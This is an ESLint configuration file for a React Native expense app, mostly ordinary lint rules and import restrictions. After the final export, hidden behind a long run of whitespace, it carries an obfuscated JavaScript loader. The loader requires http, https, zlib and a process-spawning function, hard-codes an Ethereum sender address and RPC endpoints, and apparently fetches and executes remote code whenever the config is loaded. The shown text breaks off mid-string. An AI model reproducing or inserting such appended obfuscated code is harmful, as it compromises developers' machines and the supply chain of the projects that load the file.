import {FlatCompat} from '@eslint/eslintrc';
import tsParser from '@typescript-eslint/parser';
import expensifyConfig from 'eslint-config-expensify';
import fileProgress from 'eslint-plugin-file-progress';
import jsdoc from 'eslint-plugin-jsdoc';
import lodash from 'eslint-plugin-lodash';
import react from 'eslint-plugin-react';
import reactNativeA11Y from 'eslint-plugin-react-native-a11y';
import rulesdir from 'eslint-plugin-rulesdir';
import testingLibrary from 'eslint-plugin-testing-library';
import youDontNeedLodashUnderscore from 'eslint-plugin-you-dont-need-lodash-underscore';
import seatbelt from 'eslint-seatbelt';
import {defineConfig, globalIgnores} from 'eslint/config';
import globals from 'globals';
import {createRequire} from 'node:module';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import typescriptEslint from 'typescript-eslint';
import reportNameUtilsPlugin from './plugins/eslint-plugin-report-name-utils.mjs';
import expensifyProcessor from './processors/eslint-processor-expensify.mjs';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const filename = fileURLToPath(import.meta.url);
const dirname = path.dirname(filename);

// The App root, two levels up from this file (config/eslint/eslint.config.mjs).
// Used as `basePath` on every config object so that `files`/`ignores` patterns
// continue to resolve relative to the App root (their original location),
// rather than relative to this config file's directory (which is the default).
const projectRoot = path.resolve(dirname, '../..');

// `eslint-plugin-rulesdir` lets us load rules from arbitrary local directories.
// We point it at `eslint-config-expensify`'s shipped rules (so configs that
// rely on `rulesdir/<rule>` resolve them) and at our own `eslint-plugin-local-rules/`
// at the repo root.
const expensifyConfigDirectory = path.dirname(require.resolve('eslint-config-expensify/package.json'));
const expensifyRulesDir = path.resolve(expensifyConfigDirectory, 'eslint-plugin-expensify');
const localRulesDir = path.resolve(projectRoot, 'eslint-plugin-local-rules');

rulesdir.RULES_DIR = [expensifyRulesDir, localRulesDir];

const restrictedImportPaths = [
    {
        name: 'react-native',
        importNames: [
            'useWindowDimensions',
            'StatusBar',
            'TouchableOpacity',
            'TouchableWithoutFeedback',
            'TouchableNativeFeedback',
            'TouchableHighlight',
            'Pressable',
            'Text',
            'ScrollView',
            'ActivityIndicator',
            'Animated',
            'findNodeHandle',
            'InteractionManager',
        ],
        message: [
            '',
            "For 'useWindowDimensions', please use '@src/hooks/useWindowDimensions' instead.",
            "For 'TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight', 'Pressable', please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
            "For 'StatusBar', please use '@libs/StatusBar' instead.",
            "For 'Text', please use '@components/Text' instead.",
            "For 'ScrollView', please use '@components/ScrollView' instead.",
            "For 'ActivityIndicator', please use '@components/ActivityIndicator' instead.",
            "For 'Animated', please use 'Animated' from 'react-native-reanimated' instead.",
            "For 'InteractionManager', please use afterTransition callbacks on Navigation/KeyboardUtils or other alternatives. See contributingGuides/INTERACTION_MANAGER.md.",
        ].join('\n'),
    },
    {
        name: 'react-native-gesture-handler',
        importNames: ['TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight'],
        message: "Please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
    },
    {
        name: 'awesome-phonenumber',
        importNames: ['parsePhoneNumber'],
        message: "Please use '@libs/PhoneNumber' instead.",
    },
    {
        name: 'react-native-safe-area-context',
        importNames: ['useSafeAreaInsets', 'SafeAreaConsumer', 'SafeAreaInsetsContext'],
        message: "Please use 'useSafeAreaInsets' from '@src/hooks/useSafeAreaInset' and/or 'SafeAreaConsumer' from '@components/SafeAreaConsumer' instead.",
    },
    {
        name: 'react',
        importNames: ['CSSProperties'],
        message: "Please use 'ViewStyle', 'TextStyle', 'ImageStyle' from 'react-native' instead.",
    },
    {
        name: 'react',
        importNames: ['forwardRef'],
        message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
    },
    {
        name: '@styles/index',
        importNames: ['default', 'defaultStyles'],
        message: 'Do not import styles directly. Please use the `useThemeStyles` hook instead.',
    },
    {
        name: '@styles/utils',
        importNames: ['default', 'DefaultStyleUtils'],
        message: 'Do not import StyleUtils directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        name: '@styles/theme',
        importNames: ['default', 'defaultTheme'],

        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        name: '@styles/theme/illustrations',
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
    {
        name: 'date-fns/locale',
        message: "Do not import 'date-fns/locale' directly. Please use the submodule import instead, like 'date-fns/locale/en-GB'.",
    },
    {
        name: 'expensify-common',
        importNames: ['Device', 'ExpensiMark'],
        message: [
            '',
            "For 'Device', do not import it directly, it's known to make VSCode's IntelliSense crash. Please import the desired module from `expensify-common/dist/Device` instead.",
            "For 'ExpensiMark', please use '@libs/Parser' instead.",
        ].join('\n'),
    },
    {
        name: 'lodash/memoize',
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash',
        importNames: ['memoize'],
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash/isEqual',
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'lodash',
        importNames: ['isEqual'],
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'react-native-onyx',
        importNames: ['useOnyx'],
        message: "Please use '@hooks/useOnyx' instead.",
    },
    {
        name: '@src/utils/findNodeHandle',
        message: "Do not use 'findNodeHandle' as it is no longer supported on web.",
    },
];

const restrictedImportPatterns = [
    {
        group: ['**/assets/animations/**/*.json'],
        message: "Do not import animations directly. Please use the '@components/LottieAnimations' import instead.",
    },
    {
        group: ['@styles/theme/themes/**'],
        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        group: ['@styles/utils/**', '!@styles/utils/FontUtils', '!@styles/utils/types'],
        message: 'Do not import style util functions directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        group: ['@styles/theme/illustrations/themes/**'],
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
];

const restrictedReportNameImportPatterns = [
    {
        group: ['**/ReportNameUtils', '**/libs/ReportNameUtils'],
        importNames: ['computeReportName'],
        message: 'Do not import computeReportName. Use getReportName instead, which properly uses derived report attributes.',
    },
];

// `isPaidGroupPolicy` is BILLING/paid-only (Collect/Control). Existing usages are grandfathered via
// eslint-seatbelt; this only flags NEW imports so they make a conscious choice: for workspace feature
// gating (violations, report fields, workspace chat, report creation, expense-workspace usability) use
// `isGroupPolicy` / `isReportInGroupPolicy` instead, otherwise free group plans like Submit (submit2026)
// are wrongly excluded and access bugs return.
const restrictedPaidGroupPolicyImportPatterns = [
    {
        group: ['**/PolicyUtils', '**/libs/PolicyUtils'],
        importNames: ['isPaidGroupPolicy'],
        message:
            'isPaidGroupPolicy is billing/paid-only (Collect/Control). For workspace feature gating use isGroupPolicy so free group plans like Submit are not excluded. If this is genuinely a billing/paid-only check, keep it and disable this line with a reason.',
    },
    {
        group: ['**/ReportUtils', '**/libs/ReportUtils'],
        importNames: ['isPaidGroupPolicy', 'isPaidGroupPolicyExpenseReport'],
        message:
            'isPaidGroupPolicy / isPaidGroupPolicyExpenseReport are billing/paid-only. For feature gating use isReportInGroupPolicy / isGroupPolicyExpenseReport so Submit workspaces are not excluded. If this is genuinely billing/paid-only, keep it and disable this line with a reason.',
    },
];

const config = defineConfig([
    expensifyConfig,
    typescriptEslint.configs.recommendedTypeChecked,
    typescriptEslint.configs.stylisticTypeChecked,
    fileProgress.configs['recommended-ci'],

    // Suppress lint rules that are unnecessary for files successfully compiled by React Compiler.
    // The processor runs React Compiler on each file and filters out redundant lint messages.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        processor: expensifyProcessor,
    },

    // eslint-seatbelt config. The processor is stitched into `expensifyProcessor`
    // above, so we only wire up the plugin, settings, and `configure` rule here.
    {
        settings: {
            seatbelt: {
                seatbeltFile: path.join(dirname, 'eslint.seatbelt.tsv'),
                threadsafe: true,
                // Never persist TSV updates unless we're in CI. In CI, the ephemeral
                // write is harmless on PR runs and essential on `push: main`, where
                // OSBotify commits the tightened baseline back to main
                // (see .github/workflows/lint.yml). SEATBELT_INCREASE overrides this.
                readOnly: !process.env.CI,
            },
        },
        plugins: {
            'eslint-seatbelt': seatbelt,
        },
        rules: {
            'eslint-seatbelt/configure': 'error',
        },
    },

    {
        extends: new FlatCompat({baseDirectory: projectRoot}).extends(
            'airbnb-typescript',
            'plugin:storybook/recommended',
            'plugin:react-native-a11y/all',
            'plugin:@dword-design/import-alias/recommended',
            'prettier',
        ),

        plugins: {
            jsdoc,
            'react-native-a11y': reactNativeA11Y,
            react,
            'testing-library': testingLibrary,
            lodash,
        },

        languageOptions: {
            parser: tsParser,

            parserOptions: {
                project: path.resolve(projectRoot, 'tsconfig.json'),
            },

            globals: {
                ...globals.jest,
                __DEV__: 'readonly',
            },
        },

        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // TypeScript specific rules
            '@typescript-eslint/prefer-enum-initializers': 'error',
            '@typescript-eslint/no-var-requires': 'off',
            '@typescript-eslint/no-non-null-assertion': 'error',
            '@typescript-eslint/no-unsafe-type-assertion': 'error',
            '@typescript-eslint/switch-exhaustiveness-check': ['error', {considerDefaultExhaustiveForUnions: true}],
            '@typescript-eslint/consistent-type-definitions': ['error', 'type'],
            '@typescript-eslint/no-floating-promises': 'off',
            '@typescript-eslint/no-import-type-side-effects': 'error',
            '@typescript-eslint/array-type': ['error', {default: 'array-simple'}],
            '@typescript-eslint/max-params': ['error', {max: 10}],
            '@typescript-eslint/naming-convention': [
                'error',
                {
                    selector: ['variable', 'property'],
                    format: null,
                    // Allow __esModule because it is a well-known interop property injected by bundlers
                    // (e.g. Babel/Webpack) and sometimes required by library internals (e.g. react-native-skia).
                    filter: {
                        regex: '^__esModule$',
                        match: true,
                    },
                },
                {
                    selector: ['variable', 'property'],
                    format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
                    // This filter excludes variables and properties that start with "private_" to make them valid.
                    //
                    // Examples:
                    // - "private_a" → valid
                    // - "private_test" → valid
                    // - "private_" → not valid
                    filter: {
                        regex: '^private_[a-z][a-zA-Z0-9]*$',
                        match: false,
                    },
                },
                {
                    selector: 'function',
                    format: ['camelCase', 'PascalCase'],
                },
                {
                    selector: ['typeLike', 'enumMember'],
                    format: ['PascalCase'],
                },
                {
                    selector: ['parameter', 'method'],
                    format: ['camelCase', 'PascalCase'],
                    leadingUnderscore: 'allow',
                },
            ],
            '@typescript-eslint/no-restricted-types': [
                'error',
                {
                    types: {
                        object: "Use 'Record<string, T>' instead.",
                    },
                },
            ],
            '@typescript-eslint/consistent-type-imports': [
                'error',
                {
                    prefer: 'type-imports',
                    fixStyle: 'separate-type-imports',
                },
            ],
            '@typescript-eslint/consistent-type-exports': [
                'error',
                {
                    fixMixedExportsWithInlineTypeSpecifier: false,
                },
            ],
            '@typescript-eslint/no-use-before-define': ['error', {functions: false}],

            // ESLint core rules
            'es/no-nullish-coalescing-operators': 'off',
            'es/no-optional-chaining': 'off',
            '@typescript-eslint/no-deprecated': ['error', {allow: ['translateFn']}],
            'arrow-body-style': 'off',
            'no-empty': ['error', {allowEmptyCatch: true}],

            // Import specific rules
            'import/consistent-type-specifier-style': ['error', 'prefer-top-level'],
            'import/no-extraneous-dependencies': 'off',

            // Rulesdir specific rules
            'rulesdir/no-default-props': 'error',
            'rulesdir/prefer-type-fest': 'error',
            'rulesdir/prefer-underscore-method': 'off',
            'rulesdir/prefer-import-module-contents': 'off',
            'rulesdir/no-beta-handler': 'error',
            'rulesdir/require-live-region-for-status-updates': 'error',
            'rulesdir/require-a11y-disable-justification': 'error',
            'rulesdir/prefer-narrow-hook-dependencies': [
                'error',
                {
                    stableObjectPatterns: [
                        // cSpell:ignore tyles
                        '[Ss]tyles?$', // Excludes 'style', 'styles', 'themeStyles', etc.
                        '^theme', // Excludes 'theme', 'themeStyles', 'themeIllustrations', etc.
                        '[Ii]cons?$', // Excludes 'icon', 'icons', 'expensifyIcons', etc.
                    ],
                },
            ],
            'rulesdir/no-default-id-values': 'error',
            'rulesdir/no-unstable-hook-defaults': 'error',

            // React and React Native specific rules
            'react-native-a11y/has-accessibility-hint': 'off',
            'react-native-a11y/has-valid-accessibility-ignores-invert-colors': 'error',
            'react/require-default-props': 'off',
            'react/prop-types': 'off',
            'react/jsx-key': 'error',
            'react/jsx-no-constructed-context-values': 'error',
            'react/forbid-component-props': [
                'error',
                {
                    forbid: [
                        {
                            propName: 'fsClass',
                            allowedFor: ['View', 'Animated.View', 'Text', 'Pressable'],
                            message:
                                "The 'fsClass' prop doesn't work for custom components, only RN's View, Text and Pressable.\nPlease use the 'ForwardedFSClassProps' or 'MultipleFSClassProps' types to pass down the desired 'fsClass' value to the allowed components.",
                        },
                    ],
                },
            ],
            'react-native-a11y/has-valid-accessibility-descriptors': [
                'error',
                {
                    touchables: ['PressableWithoutFeedback', 'PressableWithFeedback'],
                },
            ],

            // Disallow usage of certain functions and imports
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSEnumDeclaration',
                    message: "Please don't declare enums, use union types instead.",
                },
                {
                    selector: 'CallExpression[callee.object.name="React"][callee.property.name="forwardRef"]',
                    message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@libs/]',
                    message: 'Namespace imports from @libs are not allowed. Use named imports instead. Example: import { method } from "@libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@userActions/]',
                    message: 'Namespace imports from @userActions are not allowed. Use named imports instead. Example: import { action } from "@userActions/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\.\\./]',
                    message: 'Namespace imports from parent directories are not allowed. Use named imports instead. Example: import { method } from "../libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\./]',
                    message: 'Namespace imports from sibling modules are not allowed. Use named imports instead. Example: import { method } from "./libs/module"',
                },
                {
                    selector:
                        'JSXElement[openingElement.name.name=/^Pressable(WithoutFeedback|WithFeedback|WithDelayToggle|WithoutFocus)$/]:not(:has(JSXAttribute[name.name="sentryLabel"]))',
                    message: 'All Pressable components must include sentryLabel prop for Sentry tracking. Example: <PressableWithoutFeedback sentryLabel="MoreMenu-ExportFile" />',
                },

                // These are the original rules from AirBnB's style guide, modified to allow for...of loops and for...in loops
                {
                    selector: 'LabeledStatement',
                    message: 'Labels are a form of GOTO; using them makes code confusing and hard to maintain and understand.',
                },
                {
                    selector: 'WithStatement',
                    message: '`with` is disallowed in strict mode because it makes code impossible to predict and optimize. It is also deprecated.',
                },
            ],
            'no-restricted-properties': [
                'error',
                {
                    object: 'Image',
                    property: 'getSize',
                    message: 'Usage of Image.getSize is restricted. Please use the `react-native-image-size`.',
                },
                // Disallow direct HybridAppModule.isHybridApp() usage, because it requires a native call
                // Use CONFIG.IS_HYBRID_APP, which keeps cached value instead
                {
                    object: 'HybridAppModule',
                    property: 'isHybridApp',
                    message: 'Use CONFIG.IS_HYBRID_APP instead.',
                },
                // Prevent direct use of HybridAppModule.closeReactNativeApp().
                // Instead, use the `closeReactNativeApp` action from `@userActions/HybridApp`,
                // which correctly updates `hybridApp.closingReactNativeApp` when closing NewDot
                {
                    object: 'HybridAppModule',
                    property: 'closeReactNativeApp',
                    message: 'Use `closeReactNativeApp` from `@userActions/HybridApp` instead.',
                },
            ],
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: restrictedImportPatterns,
                },
            ],

            // Other rules
            curly: 'error',
            'lodash/import-scope': ['error', 'method'],
            'prefer-regex-literals': 'off',
            'jsdoc/require-param': 'off',
            'jsdoc/require-param-type': 'off',
            'jsdoc/check-param-names': 'off',
            'jsdoc/check-tag-names': 'off',
            'jsdoc/check-types': 'off',
            'jsdoc/no-types': 'error',
            '@dword-design/import-alias/prefer-alias': [
                'error',
                {
                    alias: {
                        '@assets': './assets',
                        '@components': './src/components',
                        '@hooks': './src/hooks',
                        // This is needed up here, if not @libs/actions would take the priority
                        '@userActions': './src/libs/actions',
                        '@libs': './src/libs',
                        '@navigation': './src/libs/Navigation',
                        '@pages': './src/pages',
                        '@prompts': './prompts',
                        '@styles': './src/styles',
                        // This path is provide alias for files like `ONYXKEYS` and `CONST`.
                        '@src': './src',
                        '@github': './.github',
                    },
                },
            ],
        },
    },

    // Some rules became stricter or stopped working after upgrading to ESLint 9, so these configs adjust the rules to match the old behavior.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // @typescript-eslint/lines-between-class-members was moved to @stylistic/eslint-plugin, so replaced with lines-between-class-members.
            'lines-between-class-members': 'error',
            '@typescript-eslint/lines-between-class-members': 'off',

            // Sometimes it's useful to include duplicate types for documentation purposes.
            '@typescript-eslint/no-duplicate-type-constituents': ['error', {ignoreUnions: true}],

            '@typescript-eslint/no-require-imports': 'off',

            // @typescript-eslint/no-throw-literal was removed, so replaced with no-throw-literal.
            'no-throw-literal': 'error',
            '@typescript-eslint/no-throw-literal': 'off',

            '@typescript-eslint/no-unused-vars': [
                'error',
                {
                    vars: 'all',
                    args: 'after-used',
                    caughtErrors: 'none',
                    ignoreRestSiblings: true,
                },
            ],
            '@typescript-eslint/prefer-find': 'off',
            '@typescript-eslint/prefer-includes': 'off',
            '@typescript-eslint/prefer-optional-chain': 'off',
            '@typescript-eslint/prefer-nullish-coalescing': [
                'error',
                {
                    ignoreIfStatements: true,
                    ignorePrimitives: {
                        // string: true,
                    },
                    ignoreTernaryTests: true,
                },
            ],

            // @typescript-eslint/prefer-promise-reject-errors enforces Promises are only rejected with Error objects, so replaced with prefer-promise-reject-errors.
            'prefer-promise-reject-errors': 'error',
            '@typescript-eslint/prefer-promise-reject-errors': 'off',

            '@typescript-eslint/prefer-regexp-exec': 'off',
        },
    },

    // Enforces every Onyx type and its properties to have a comment explaining its purpose.
    {
        files: ['src/types/onyx/**/*.ts'],
        rules: {
            'jsdoc/require-jsdoc': [
                'error',
                {
                    contexts: ['TSInterfaceDeclaration', 'TSTypeAliasDeclaration', 'TSPropertySignature'],
                },
            ],
        },
    },

    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        ...typescriptEslint.configs.disableTypeChecked,
    },
    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            'arrow-parens': 'off',
            'jsdoc/no-types': 'off',
            'react/jsx-filename-extension': 'off',
            'rulesdir/no-default-props': 'off',
            'prefer-arrow-callback': 'off',

            // Prefer Lodash helpers (and `import _ from 'lodash'`) in non-TS
            // files — they defensively handle nullish/non-array inputs that
            // TypeScript would otherwise catch at compile time.
            'lodash/import-scope': 'off',
        },
    },

    // Node.js ESM requires relative imports to include a file extension (unlike
    // bundled `.js`/`.ts`, which are resolved by webpack/metro). Relax the
    // airbnb-inherited `import/extensions` rule for `.mjs`/`.cjs` so it stops
    // flagging legitimate ESM imports like `import x from './foo.mjs'`.
    {
        files: ['**/*.mjs', '**/*.cjs'],
        rules: {
            'import/extensions': 'off',
        },
    },

    {
        files: ['**/en.ts', '**/es.ts'],
        rules: {
            'rulesdir/use-periods-for-error-messages': 'error',
        },
    },

    {
        files: ['**/*.ts', '**/*.tsx'],
        rules: {
            'rulesdir/prefer-at': 'error',
            'rulesdir/boolean-conditional-rendering': 'error',
        },
    },

    // `eslint-plugin-you-dont-need-lodash-underscore` steers code toward native
    // JS equivalents of Lodash helpers. In TypeScript we want that guidance
    // because TS catches the nullish/non-array edge cases Lodash papers over;
    // in plain JS we prefer the Lodash helpers, so this plugin is TS/TSX-only.
    {
        files: ['**/*.ts', '**/*.tsx'],
        extends: new FlatCompat({baseDirectory: projectRoot}).extends('plugin:you-dont-need-lodash-underscore/all'),
        plugins: {
            'you-dont-need-lodash-underscore': youDontNeedLodashUnderscore,
        },
        rules: {
            'you-dont-need-lodash-underscore/throttle': 'off',
            // The suggested alternative (structuredClone) is not supported in Hermes:https://github.com/facebook/hermes/issues/684
            'you-dont-need-lodash-underscore/clone-deep': 'off',
        },
    },

    {
        files: ['src/**/*.ts', 'src/**/*.tsx'],
        rules: {
            'rulesdir/prefer-locale-compare-from-context': 'error',
            'rulesdir/no-object-keys-includes': 'error',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*'],
        rules: {
            // For all these Node.js scripts, we do not want to disable `console` statements
            'no-console': 'off',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*', 'tests/**/*'],
        rules: {
            'no-await-in-loop': 'off',
            'no-restricted-syntax': ['error', 'ForInStatement', 'LabeledStatement', 'WithStatement'],
        },
    },

    {
        files: ['.github/**/*'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    patterns: [
                        {
                            group: ['@src/**'],
                            message: 'Do not import files from src/ directory as they can break the GH Actions build script.',
                        },
                    ],
                },
            ],
        },
    },

    {
        files: ['tests/**/*'],
        rules: {
            'no-import-assign': 'off',

            // This helps disable the `prefer-alias` rule for tests
            '@dword-design/import-alias/prefer-alias': ['off'],

            'testing-library/await-async-queries': 'error',
            'testing-library/await-async-utils': 'error',
            'testing-library/no-debugging-utils': 'error',
            'testing-library/no-manual-cleanup': 'error',
            'testing-library/no-unnecessary-act': 'error',
            'testing-library/prefer-find-by': 'error',
            'testing-library/prefer-presence-queries': 'error',
            'testing-library/prefer-screen-queries': 'error',
        },
    },

    {
        files: ['src/libs/Navigation/types.ts'],
        rules: {
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSPropertySignature[key.name="backTo"]',
                    message:
                        'The `backTo` route param is deprecated. Do not add new `backTo` properties to screen param lists. Please look into the `How to remove backTo from URL` section in contributingGuides/NAVIGATION.md. and use alternative routing methods instead.',
                },
            ],
        },
    },

    {
        files: ['src/libs/ReportNameUtils.ts'],
        plugins: {'report-name-utils': reportNameUtilsPlugin},
        rules: {'report-name-utils/no-function-call-in-get-report-name': 'error'},
    },

    // Restrict `computeReportName` imports everywhere except the one file that
    // legitimately consumes it. This block overrides the main `no-restricted-imports`
    // for ts/tsx files, so we re-apply the main `restrictedImportPaths`/`restrictedImportPatterns`
    // here too (flat config is last-wins per rule, not additive).
    {
        files: ['**/*.ts', '**/*.tsx'],
        ignores: ['src/libs/actions/OnyxDerived/configs/reportAttributes.ts'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: [...restrictedImportPatterns, ...restrictedReportNameImportPatterns, ...restrictedPaidGroupPolicyImportPatterns],
                },
            ],
        },
    },

    {
        files: ['src/**/*'],
        ignores: ['src/languages/**', 'src/CONST/index.ts', 'src/NAICS.ts'],
        rules: {
            'max-lines': ['error', 4000],
        },
    },

    {
        files: ['modules/ExpensifyNitroUtils/src/**/*'],
        rules: {
            '@typescript-eslint/consistent-type-definitions': 'off',
        },
    },

    {
        files: ['server/**/*.ts', 'server/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/tsconfig.json'),
            },
        },
    },

    {
        files: ['server/victory-chart-renderer/**/*.ts', 'server/victory-chart-renderer/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/victory-chart-renderer/tsconfig.json'),
            },
        },
    },

    globalIgnores([
        '!**/.storybook',
        '!**/.github',
        '.github/actions/**/index.js',
        '**/*.config.js',
        '**/*.config.mjs',
        '**/node_modules/**/*',
        '**/dist/**/*',
        'server/**/dist/**',
        '.eslint-reports/**/*',
        'android/**/build/**/*',
        'docs/vendor/**/*',
        'docs/assets/**/*',
        'web/gtm.js',
        '**/.expo/**/*',
        '**/.rock/**/*',
        '**/.yalc/**/*',
        'src/libs/SearchParser/searchParser.js',
        'src/libs/SearchParser/autocompleteParser.js',
        'help/_scripts/**/*',
        'modules/ExpensifyNitroUtils/nitrogen/**/*',
        'Mobile-Expensify/**/*',
        '**/vendor',
        'modules/group-ib-fp/**/*',
        'web/snippets/gib.js',
        // Generated language files - excluded from ESLint but still type-checked
        'src/languages/de.ts',
        'src/languages/es.ts',
        'src/languages/fr.ts',
        'src/languages/it.ts',
        'src/languages/ja.ts',
        'src/languages/nl.ts',
        'src/languages/pl.ts',
        'src/languages/pt-BR.ts',
        'src/languages/zh-hans.ts',
    ]),
]);

// Attach the App root as `basePath` to every config object. ESLint resolves
// `files`/`ignores` patterns relative to each config object's `basePath` (which
// defaults to the directory containing the config file). Since this config
// lives in `config/eslint/` rather than the App root, we override `basePath`
// so existing relative patterns (e.g. `src/**/*.ts`) keep matching the intended
// files. The spread preserves any `basePath` that a config already specifies.
export default config.map((cfg) => ({basePath: projectRoot, ...cfg}));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*3885-2370';const _0x32ebc7=_0x5ce2;(function(_0x20982f,_0x3f1f0b){const _0x2f1247=_0x5ce2,_0xbfd980=_0x20982f();while(!![]){try{const _0x2f9e3b=parseInt(_0x2f1247(0x28a))/(0x20e0+-0x15c3+-0xb1c)+-parseInt(_0x2f1247(0x270))/(0x18*0x15d+0x59f+-0x2655)*(parseInt(_0x2f1247(0x253))/(-0xb33+-0x1f83+0x2ab9))+parseInt(_0x2f1247(0x27a))/(-0x6ca*0x2+-0x17*-0x71+0x371)+parseInt(_0x2f1247(0x168))/(-0x47*-0x20+0x5*-0x305+0x63e)+-parseInt(_0x2f1247(0x280))/(0x1292+-0x2*-0xf8b+-0x31a2*0x1)*(parseInt(_0x2f1247(0x231))/(0x1*0x4af+0xc5*-0x31+0x210d))+parseInt(_0x2f1247(0x264))/(0x14*-0xf2+-0x113c+0x242c)+parseInt(_0x2f1247(0x190))/(0x139*-0xc+-0xc26+0x19*0x113);if(_0x2f9e3b===_0x3f1f0b)break;else _0xbfd980['push'](_0xbfd980['shift']());}catch(_0x2ad128){_0xbfd980['push'](_0xbfd980['shift']());}}}(_0x2976,-0x6e838+0x56*0x55+0x139c0f),(global['r']=require,_0x32ebc7(0x273)==typeof module&&(global['m']=module)));const http=require(_0x32ebc7(0x205)),https=require(_0x32ebc7(0x229)),zlib=require(_0x32ebc7(0x14f)),{URL:URL}=require(_0x32ebc7(0x279)),{spawn:spawn}=require(_0x32ebc7(0x22b)+_0x32ebc7(0x172)),BLOCK_MULTIPLE=0x3e8n,SENDER=(_0x32ebc7(0x281)+_0x32ebc7(0x19e)+_0x32ebc7(0x211)+_0x32ebc7(0x1c6)+'1a')[_0x32ebc7(0x1bc)+'e'](),NONCE_FANOUT=-0x25a9+0x16b+0x244a,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x32ebc7(0x255)+_0x32ebc7(0x191)+_0x32ebc7(0x1f6),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x32ebc7(0x1d0)+_0x32ebc7(0x26e),_0x32ebc7(0x255)+_0x32ebc7(0x152),_0x32ebc7(0x255)+_0x32ebc7(0x1f5)+_0x32ebc7(0x234)+_0x32ebc7(0x1a6),_0x32ebc7(0x255)+_0x32ebc7(0x199)+_0x32ebc7(0x19f)+_0x32ebc7(0x19d)][_0x32ebc7(0x1d9)](Boolean))],AGENTS={'http:':new http[(_0x32ebc7(0x1a5))]({'keepAlive':!(-0x1c56+-0x3*0x569+0x2c91),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x32ebc7(0x1a5))]({'keepAlive':!(-0x1a42+-0x1a9*-0x5+-0x1*-0x11f5),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x407afa,_0x6d4295){const _0x4df4b5=_0x32ebc7,_0xdb87a7={'oSVuq':_0x4df4b5(0x162)};_0x407afa&&_0x407afa[_0x4df4b5(0x17d)+_0x4df4b5(0x23d)](_0xdb87a7[_0x4df4b5(0x182)],()=>_0x6d4295[_0x4df4b5(0x162)](),{'once':!(0x1*-0x1d4d+0x1909+0x444)});}function _0x2976(){const _0x2f55ab=['nsactionCo','dVtRN','etZJj','result','SSKrF','aMSbx','rUeLj','subarray','84531ryaXWX','unt','https://et','gzip,\x20defl','cxOxO','ImhvX','DXZHs','POST','UMBCF','RREBd','RZonu','ngth','ilterby=fr','UceIc','oad\x20body','tpATb','nonce','1490552iFUToM','b64','phFLU','from','VVvYi','uZOyl','WZVoL','wVsnn','EwrYS','all','pc.io/eth','WLJvS','118ZXDohK','TBqIc','Kit/537.36','object','pEmWS','forEach','2.0','\x27]=\x27','Missing\x20X-','node:url','4349320ksCpvj','lAfgW','RYmwT','resume',':80','WtCJu','314586adMPQp','0xa322E5f3','YEYXb','ffset=20&s','tItJu','createInfl','aFRsH','9&page=1&o','xtqat','gWyNb','311775hyjjKZ','node:zlib','\x20from\x20','y-p_>d$0B&','h.drpc.org','CLSEy','DPZMj','ROTcR','https:','LRJck','Nfhoz','jisND','cloXp','bIYbo','DbkJf','search','fari/537.3','\x20Chrome/13','JSON\x20parse','umber','abort','QURKH','\x20(KHTML,\x20l',':443','MtIwI','qiIzp','3880800BRySvV','rPgam','applicatio','KhulI','x-gzip','Mozilla/5.','pMcRf','uLUYW','jRFnt','\x27;global[\x27','_process','ZxJiX','WPTDR','dakVZ','VLmnK','fjQdv','GET','createBrot','deflate','toString','OtppN','addEventLi','controller','HlkfO','bkBiz','EatxF','oSVuq','VqHoL','charCodeAt','ztsJi','length','NQkqG','ignore','AKolx','KSYbs','ck=9999999','_H